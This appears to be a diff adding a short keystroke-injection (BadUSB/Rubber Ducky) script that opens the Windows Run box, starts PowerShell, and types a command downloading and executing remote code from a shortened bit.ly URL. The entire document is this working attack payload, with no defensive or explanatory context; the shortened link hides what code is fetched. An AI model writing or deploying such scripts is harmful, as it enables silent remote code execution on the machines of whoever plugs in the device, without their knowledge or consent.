@@ -1,0 +1,8 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 500
+STRING iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
+ENTER
